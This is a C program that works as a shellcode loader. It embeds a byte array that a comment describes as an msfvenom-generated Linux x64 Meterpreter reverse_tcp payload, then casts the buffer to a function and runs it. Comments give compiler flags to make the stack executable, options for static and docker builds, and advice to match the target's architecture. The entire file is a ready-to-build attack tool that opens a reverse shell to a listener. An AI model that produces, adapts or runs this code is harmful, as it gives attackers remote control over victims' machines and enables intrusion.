#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

//make sure to use the -z execstack options when trying to run shellcode, since by default the stack where you save your shellcode is not executable
//gcc -o hack.out hack.c -z execstack  / gcc -o hack.out hack.c -z execstack -static  / docker run --rm -v "$PWD":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -o newelf.elf newelf.c
//before compiling it, make sure the processor architecture match the target environment

int main (int argc, char **argv)
{
  //msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=443 PREPENDFORK=true -f c -o c_shellcode.txt
  unsigned char buf[] = 
"\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a\x3c"
"\x58\x0f\x05\x04\x70\x0f\x05\x6a\x39\x58\x0f\x05\x48\x85\xc0"
"\x75\xea\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d"
"\x31\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e"
"\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x01\xbb"
"\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f"
"\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23"
"\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59"
"\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e"
"\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

  // Run our shellcode
  int (*ret)() = (int(*)())buf;
  ret();
}
